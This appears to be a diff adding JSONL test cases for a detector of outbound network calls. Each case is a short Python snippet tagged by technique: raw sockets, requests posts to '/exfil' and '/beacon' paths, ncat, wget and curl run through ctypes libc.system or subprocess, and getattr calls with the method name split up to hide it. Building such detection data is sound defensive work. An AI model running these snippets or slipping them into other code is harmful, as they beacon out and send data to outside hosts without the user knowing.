+{"mode": "runtime_symbol_call", "code": "import ctypes\nlibc = ctypes.CDLL(\"libc.so.6\")\nlibc.system(b\"ncat 8.8.8.8 8080\")\n"}
+{"mode": "runtime_symbol_call", "code": "import ctypes\nlibc = ctypes.CDLL(\"libSystem.B.dylib\")\nlibc.system(b\"ncat 1.2.3.4 80\")\n"}
+{"mode": "direct_method_call", "code": "import socket\nsocket.create_connection((\"203.0.113.7\", 443))\n"}
+{"mode": "subprocess_spawn", "code": "import subprocess\nsubprocess.run([\"nc\", \"http://8.8.8.8:80/data\"])\n"}
+{"mode": "dynamic_attr_call", "code": "import socket\nf = getattr(socket.socket, \"c\" + \"on\" + \"nect\")\nf(socket.socket(), (\"198.51.100.2\", 31337))\n"}
+{"mode": "http_client_call", "code": "import requests\nrequests.get(\"http://8.8.8.8:5000/data\", params={\"k\": \"v\"})\n"}
+{"mode": "http_client_call", "code": "import requests\nrequests.post(\"http://1.2.3.4:5000/beacon\", data={\"k\": \"v\"})\n"}
+{"mode": "direct_method_call", "code": "import socket\nsocket.socket().connect((\"198.51.100.2\", 31337))\n"}
+{"mode": "runtime_symbol_call", "code": "import ctypes\nlibc = ctypes.CDLL(\"libSystem.B.dylib\")\nlibc.system(b\"wget 203.0.113.7 443\")\n"}
+{"mode": "http_client_call", "code": "import requests\nrequests.get(\"http://203.0.113.7:9001/data\", params={\"k\": \"v\"})\n"}
+{"mode": "direct_method_call", "code": "import socket\nsocket.socket().connect_ex((\"203.0.113.7\", 4444))\n"}
+{"mode": "runtime_symbol_call", "code": "import ctypes\nlibc = ctypes.CDLL(\"libc.so.7\")\nlibc.system(b\"ncat 8.8.8.8 8000\")\n"}
+{"mode": "http_client_call", "code": "import urllib.request\nurllib.request.urlopen(\"http://203.0.113.7:9001/exfil\", data=b\"x\")\n"}
+{"mode": "subprocess_spawn", "code": "import subprocess\nsubprocess.Popen([\"ncat\", \"10.0.0.5\", \"4444\"])\n"}
+{"mode": "direct_method_call", "code": "import socket\nsocket.create_connection((\"10.0.0.5\", 443))\n"}
+{"mode": "direct_method_call", "code": "import socket\nsocket.socket().connect_ex((\"10.0.0.5\", 443))\n"}
+{"mode": "subprocess_spawn", "code": "import subprocess\nsubprocess.Popen([\"curl\", \"10.0.0.5\", \"443\"])\n"}
+{"mode": "http_client_call", "code": "import requests\nrequests.post(\"http://198.51.100.2:80/beacon\", data={\"k\": \"v\"})\n"}
+{"mode": "http_client_call", "code": "import requests\nrequests.get(\"http://203.0.113.7:31337/data\", params={\"k\": \"v\"})\n"}
+{"mode": "runtime_symbol_call", "code": "import ctypes\nlibc = ctypes.CDLL(\"libSystem.B.dylib\")\nlibc.system(b\"nc 8.8.8.8 31337\")\n"}
+{"mode": "direct_method_call", "code": "import socket\nsocket.create_connection((\"192.168.1.10\", 80))\n"}
+{"mode": "direct_method_call", "code": "import socket\nsocket.create_connection((\"8.8.8.8\", 443))\n"}
+{"mode": "http_client_call", "code": "import requests\nrequests.get(\"http://198.51.100.2:80/data\", params={\"k\": \"v\"})\n"}
+{"mode": "subprocess_spawn", "code": "import subprocess\nsubprocess.run([\"curl\", \"http://1.2.3.4:8080/beacon\"])\n"}
+{"mode": "subprocess_spawn", "code": "import os\nos.system(\"ncat 8.8.8.8 31337\")\n"}
+{"mode": "runtime_symbol_call", "code": "import ctypes\nlibc = ctypes.CDLL(\"ws2_32.dll\")\nlibc.system(b\"ncat 172.16.0.3 4444\")\n"}
+{"mode": "http_client_call", "code": "import urllib.request\nurllib.request.urlopen(\"http://192.168.1.10:443/upload\", data=b\"x\")\n"}
+{"mode": "http_client_call", "code": "import requests\nrequests.post(\"http://172.16.0.3:5000/upload\", data={\"k\": \"v\"})\n"}
+{"mode": "direct_method_call", "code": "import socket\nsocket.socket().connect_ex((\"8.8.8.8\", 4444))\n"}
+{"mode": "runtime_symbol_call", "code": "import ctypes\nlibc = ctypes.CDLL(\"libSystem.B.dylib\")\nlibc.system(b\"wget 10.0.0.5 5000\")\n"}
+{"mode": "direct_method_call", "code": "import socket\nsocket.socket().connect((\"203.0.113.7\", 8000))\n"}
+{"mode": "subprocess_spawn", "code": "import subprocess\nsubprocess.Popen([\"wget\", \"203.0.113.7\", \"8080\"])\n"}
+{"mode": "direct_method_call", "code": "import socket\nsocket.socket().connect((\"10.0.0.5\", 8000))\n"}
+{"mode": "http_client_call", "code": "import requests\nrequests.post(\"http://203.0.113.7:8000/exfil\", data={\"k\": \"v\"})\n"}
+{"mode": "http_client_call", "code": "import requests\nrequests.get(\"http://198.51.100.2:8080/data\", params={\"k\": \"v\"})\n"}
+{"mode": "dynamic_attr_call", "code": "import socket\nf = getattr(socket, \"create_\" + \"connection\")\nf((\"1.2.3.4\", 9001))\n"}
+{"mode": "http_client_call", "code": "import requests\nrequests.post(\"http://198.51.100.2:9001/beacon\", data={\"k\": \"v\"})\n"}
+{"mode": "http_client_call", "code": "import requests\nrequests.post(\"http://172.16.0.3:31337/data\", data={\"k\": \"v\"})\n"}
+{"mode": "http_client_call", "code": "import requests\nrequests.post(\"http://1.2.3.4:4444/beacon\", data={\"k\": \"v\"})\n"}
+{"mode": "subprocess_spawn", "code": "import subprocess\nsubprocess.run([\"ncat\", \"http://8.8.8.8:443/beacon\"])\n"}
